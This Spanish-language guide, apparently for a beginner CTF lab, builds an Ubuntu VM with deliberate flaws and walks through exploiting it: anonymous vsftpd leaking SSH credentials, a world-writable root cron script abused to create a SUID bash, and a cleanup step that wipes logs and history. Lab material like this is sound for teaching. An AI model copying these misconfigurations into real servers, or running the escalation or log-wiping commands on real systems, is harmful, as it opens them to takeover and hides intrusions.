# FTP-Vuln: Máquina Vulnerable Boot-to-Root

## Objetivo

Diseño de una máquina vulnerable con las siguientes características:

- **Ubuntu Server** como sistema base.
- Dos flags:
  - `/home/<user>/user.txt`
  - `/root/root.txt`
- Nivel de dificultad: **bajo/principiante**.
- Vector de ataque: **un protocolo mal configurado (FTP)**.
- Comprometible completamente (boot-to-root).

## Idea de Escenario

**Servicio FTP mal configurado (vsftpd)**:

- Login anónimo habilitado.
- Un archivo oculto con credenciales.
- Usuario con contraseña reutilizada para SSH.
- SSH con autenticación por contraseña habilitada.
- Escalada de privilegios mediante una tarea en cron.

## Estructura de la Máquina

| Componente              | Detalle                                    |
| ----------------------- | ------------------------------------------ |
| Sistema base            | Ubuntu Server 20.04                        |
| Servicio vulnerable     | vsftpd 3.0.3 con login anónimo habilitado  |
| Usuario no-root         | `oramiuser` con `/home/oramiuser/user.txt` |
| Flag de root            | `/root/root.txt`                           |
| Escalada de privilegios | Mediante una tarea en cron mal configurada |

---

## Paso a Paso para Configurar la Máquina

### 1. Instalar Ubuntu Server (VM)

Se crea una VM en VirtualBox, VMware o KVM con Ubuntu Server 20.04:

- Asignación mínima de 1GB RAM y 1 CPU.
- Nombre: `FTP-Vuln`.
- Red configurada como **adaptador en puente (bridge)** o **host-only** para pruebas.
- SSH instalado: `sudo apt install openssh-server`

### 2. Crear usuario y flags

```bash
# Como root:
adduser oramiuser
echo "technova{this_is_the_user_flag}" > /home/oramiuser/user.txt
echo "technova{this_is_the_root_flag}" > /root/root.txt

# Asignación de permisos
chmod 600 /home/oramiuser/user.txt
chmod 600 /root/root.txt
chown oramiuser:oramiuser /home/oramiuser/user.txt
```

### 3. Instalar y configurar vsftpd

```bash
apt update && apt install vsftpd -y
```

Edición de la configuración:

```bash
nano /etc/vsftpd.conf
```

Líneas que deben quedar configuradas:

```
listen=NO
listen_ipv6=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_root=/srv/ftp
```

Preparación del directorio para FTP:

```bash
mkdir -p /srv/ftp/files
chmod 755 /srv/ftp
chmod 777 /srv/ftp/files
echo "credenciales: oramiuser:123456" > /srv/ftp/files/leeme.txt
```

Reinicio del servicio:

```bash
systemctl restart vsftpd
```

### 4. Configurar SSH

Se requiere que `oramiuser` pueda acceder via SSH con contraseña:

```bash
passwd oramiuser  # se usa la misma contraseña que en el FTP
nano /etc/ssh/sshd_config
```

Opciones que deben estar activas en `sshd_config`:

```
PermitRootLogin prohibit-password
PasswordAuthentication yes
```

Reinicio de SSH:

```bash
systemctl restart ssh
```

### 5. Agregar vector de escalada de privilegios

Creación del cronjob ejecutado por root:

```bash
echo "* * * * * root /usr/local/bin/backup.sh" > /etc/cron.d/rootjob
chmod 644 /etc/cron.d/rootjob
```

Creación del script vulnerable:

```bash
echo -e '#!/bin/bash\ntar czf /tmp/backup.tar.gz /home/oramiuser 2>/dev/null' > /usr/local/bin/backup.sh
chmod 777 /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

Esto permite que cualquier usuario lo modifique para ejecutar comandos como root.

### 6. Limpiar la máquina antes de empaquetar

```bash
sudo rm -rf /var/log/*.log
history -c
unset HISTFILE
sudo rm -rf /home/*/.bash_history
```

### 7. Apagar y exportar la VM

- **VirtualBox**: Menu > Archivo > Exportar servicio virtualizado. Formato OVA o VMDK.
- **VMware**: Se comprime el archivo `.vmdk` y `.vmx`.
- **QEMU/KVM**: Se usa `qemu-img convert` para exportar a `.qcow2`.

---

## Checklist de Verificación

- Funcionamiento del FTP anónimo.
- Acceso via SSH.
- Escalada de privilegios funcional.
- Flags en sus ubicaciones correctas.
- Ruta boot-to-root sin pasos imposibles.
- Estabilidad de la máquina al iniciar.

---

## Ruta de Explotación (Walkthrough)

### Fase 1: Enumeración de servicios

```bash
nmap -sC -sV -Pn <IP_OBJETIVO>
```

Resultado esperado:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.x
```

### Fase 2: Enumeración de FTP anónimo

```bash
ftp <IP_OBJETIVO>
# Usuario: anonymous
# Password: [presionar ENTER]
```

Una vez dentro de la sesión FTP:

```bash
cd files
ls
get leeme.txt
```

El archivo `leeme.txt` contiene:

```
credentials: oramiuser:123456
```

### Fase 3: Acceso SSH con credenciales descubiertas

```bash
ssh oramiuser@<IP_OBJETIVO>
# Contrasena: 123456
```

Verificación del usuario y lectura de la flag:

```bash
whoami
# oramiuser

cat /home/oramiuser/user.txt
# technova{user_flag_is_here}
```

### Fase 4: Enumeración de cronjobs

```bash
cat /etc/cron.d/rootjob
```

Resultado:

```
* * * * * root /usr/local/bin/backup.sh
```

Verificación de permisos:

```bash
ls -l /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root ... (777)
```

### Fase 5: Escalada de privilegios (cronjob vulnerable)

Sobrescritura del script como `oramiuser`:

```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

Se espera 1 minuto a que el cronjob se ejecute. Luego:

```bash
/tmp/rootbash -p
whoami
# root
```

### Fase 6: Captura de la flag root

```bash
cat /root/root.txt
# technova{root_flag_is_here}
```

---

## Herramientas Utilizadas

| Herramienta | Uso                                      |
| ----------- | ---------------------------------------- |
| nmap        | Escaneo de puertos y servicios           |
| ftp         | Acceso anónimo a FTP                     |
| ssh         | Acceso remoto a shell                    |
| cron        | Ejecución automática de tareas como root |
| bash        | Creación y ejecución de scripts          |
| chmod       | Cambio de permisos de archivos           |

## Vulnerabilidades Explotadas

1. FTP anónimo expuesto.
2. Archivo con credenciales públicas.
3. Cronjob ejecutado como root y modificable.
4. Permisos `777` en script ejecutado por root.
5. Uso del bit SUID para ejecutar `/bin/bash` como root.

---

## Consejos de Buen Diseño

- Banner de advertencia en `/etc/motd`.
- Sin conexiones externas innecesarias.
- Sin IPs reales en scripts (se usa `YOUR_IP_HERE`).
- Snapshot de la VM antes de exportarla.
